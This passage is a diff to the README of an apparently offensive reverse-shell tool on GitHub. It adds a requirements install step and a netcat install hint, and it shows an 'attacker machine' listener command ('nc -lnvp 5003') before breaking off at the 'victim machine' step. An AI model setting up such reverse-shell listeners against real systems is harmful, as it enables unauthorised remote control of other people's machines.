@@ -16,11 +16,15 @@ git clone https://github.com/Keyj33k/ReverseShell.git
 ---
 ![exa](https://github.com/Keyj33k/profiles/blob/main/profile/revsh.png?raw=true)
 ---
+- IMPORTANT: Use this command to install the requirements:
+```
+pip install -r requirements.txt
+```
 - OPTIONAL: You can make a executable using command:
 ```
 pyinstaller --onefile reverseshell.py
 ```
-- PyInstaller command not found?:
+- PyInstaller command not found?
 ```
 pip install pyinstaller
 ```
@@ -30,6 +34,10 @@ pip install pyinstaller
 - On the attacker machine:
 ```
 nc -lnvp 5003
+```
+- NC command not found (Debian/-based)?
+```
+sudo apt-get install -y netcat
 ```
 
 - On the vivtim machine:
